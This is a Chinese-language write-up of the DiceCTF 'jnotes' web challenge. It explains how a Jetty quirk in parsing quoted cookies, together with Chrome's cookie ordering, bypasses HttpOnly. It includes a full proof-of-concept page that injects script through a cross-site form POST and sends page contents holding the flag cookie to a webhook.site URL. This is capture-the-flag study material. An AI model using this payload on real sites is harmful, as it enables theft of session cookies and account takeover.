---
tags:
  - Cookie
---

# Jnotes

这题的关键是如何 bypass httponly 拿 cookie
admin-bot 可以直接访问一个页面，且环境中的 `create` 路由没有同源策略。

```java
"""<html>
<head></head>
<body>
<h1>jnotes</h1>

<form method="post" action="create">
<textarea rows="20" cols="50" name="note">
%s
</textarea>
<br>
<button type="submit">Save notes</button>
</form>

<hr style="margin-top: 10em">
<footer>
<i>see something unusual on our site? report it <a href="https://adminbot.mc.ax/web-jnotes">here</a></i>
</footer>
</body>
</html>""".formatted(note));
```

利用了 Jetty webserver 的特性：当读取 cookie 时如果读到一个 `"`，那么它会一直读到下一个 `"` 闭合，从而忽略分号。

[CookieCutter.java#L227](https://github.com/eclipse/jetty.project/blob/016de2faebdd9ac90f00df9ac4bc7c74193e68e6/jetty-http/src/main/java/org/eclipse/jetty/http/CookieCutter.java#L227)

> - the browser sends the cookie header: `note="a; FLAG=dice{flag}; end=b";`
> - but Jetty will parse it as a single cookie: note=`a; FLAG=dice{flag}; end=b;`

然后控制 cookie 解析顺序

- chrome orders cookies by longest path length first, then least recently updated first.

![202302142012556](https://cdn.silente.top/img/202302142012556.png)

poc 页面

```html
<!DOCTYPE html>
<html lang="en">
  <body>
    <form method="POST" action="https://jnotes.mc.ax/create">
      <input id="p" name="note" value="" />
    </form>

    <script>
      document.querySelector("#p").value = `</textarea>
      <\x73cript>
      if (window.location.pathname !== "//") {
        document.cookie = 'note="a; path=//';
        document.cookie = 'note=se';
        document.cookie = 'END=ok" ; path=';
        w = window.open('https://jnotes.mc.ax//');
        setTimeout(()=>{
          ex = w.document.body.innerHTML;
          navigator.sendBeacon('https://webhook.site/5ec3a26c-4e09-435c-87fe-1213f9f0ce0f', ex);
        }, 500);
      }
      </\x73cript>`;
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![202302142022745](https://cdn.silente.top/img/202302142022745.png)